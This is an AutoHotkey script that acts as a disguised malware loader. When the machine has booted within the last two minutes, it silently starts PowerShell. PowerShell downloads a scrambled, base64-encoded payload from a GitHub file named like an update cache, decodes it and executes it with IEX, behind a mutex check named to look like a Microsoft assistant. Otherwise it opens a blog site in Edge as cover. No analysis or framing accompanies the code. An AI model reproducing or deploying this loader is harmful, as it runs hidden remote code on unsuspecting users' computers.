
b1 := GetSystemBootTime()
b2 := A_Now
b3 := DateDiff(b1, b2)

if( b3 < 120 )
{
   ShellRun("powershell.exe", "try{[System.Threading.Mutex]::OpenExisting('ms_assistant_Mutex').Close();return}catch{};$data=Invoke-RestMethod 'https://raw.githubusercontent.com/chaeminho34677/AppData/refs/heads/main/update_cache.tmp';$m=[math]::Ceiling($data.Length/2);$s=$data.Substring($m)+$data.Substring(0,$m);$b=[System.Convert]::FromBase64String($s);$c=[System.Text.Encoding]::UTF8.GetString($b);IEX $c" . "", "", "", 0)
}else
{
    ShellRun("msedge.exe", "https://tistory.com", "", "", 0)
}

DateDiff(start, end) {
   
    startYear := SubStr(start, 1, 4)
    startMonth := SubStr(start, 6, 2)
    startDay := SubStr(start, 9, 2)
    startHour := SubStr(start, 12, 2)
    startMinute := SubStr(start, 15, 2)
    startSecond := SubStr(start, 18, 2)

    ; End Date
    endYear := SubStr(end, 1, 4)
    endMonth := SubStr(end, 5, 2)
    endDay := SubStr(end, 7, 2)
    endHour := SubStr(end, 9, 2)
    endMinute := SubStr(end, 11, 2)
    endSecond := SubStr(end, 13, 2)

    startTimeInSeconds := DateToSeconds(startYear, startMonth, startDay, startHour, startMinute, startSecond)
    endTimeInSeconds := DateToSeconds(endYear, endMonth, endDay, endHour, endMinute, endSecond)

    return endTimeInSeconds - startTimeInSeconds
}

DateToSeconds(year, month, day, hour, minute, second) {
    date := (Integer(year) - 1970) * 31536000  
    date += (Integer(month) - 1) * 2628000     
    date += (Integer(day) - 1) * 86400         
    date += Integer(hour) * 3600               
    date += Integer(minute) * 60               
    date += Integer(second)        
    return date
}
GetSystemBootTime() {
    for process in ComObjGet("winmgmts:\\.\root\cimv2").ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
        return SubStr(process.LastBootUpTime, 1, 4) . "-" . SubStr(process.LastBootUpTime, 5, 2) . "-" . SubStr(process.LastBootUpTime, 7, 2) . " " . SubStr(process.LastBootUpTime, 9, 2) . ":" . SubStr(process.LastBootUpTime, 11, 2) . ":" . SubStr(process.LastBootUpTime, 13, 2)
}

ShellRun(filePath, arguments := "", directory := "", operation := "", show := 0) {
    static VT_UI4 := 0x13, SWC_DESKTOP := ComValue(VT_UI4, 0x8)
    ComObject("Shell.Application").Windows.Item(SWC_DESKTOP).Document.Application
        .ShellExecute(filePath, arguments, directory, operation, show)
}
